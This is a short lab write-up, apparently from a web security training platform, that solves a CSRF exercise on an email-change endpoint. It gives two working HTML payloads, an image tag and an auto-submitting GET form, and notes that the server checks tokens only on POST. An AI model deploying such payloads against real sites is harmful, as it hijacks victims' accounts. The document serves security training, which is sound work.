

his lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`


--------------

# Solution


```
<html>
  <body>
    <img src="https://0ab50083044360c0803003c700b90077.web-security-academy.net/my-account/change-email?email=pwned@evil-user.net" />
  </body>
</html>
```

or 


```
<html>
  <body>
    <form action="https://0ab1007704a070ea80be4e7d00d50071.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```


The server only validates CSRF tokens on POST. When the same endpoint accepts GET, the token check is skipped entirely. Host this on the exploit server and deliver to victim.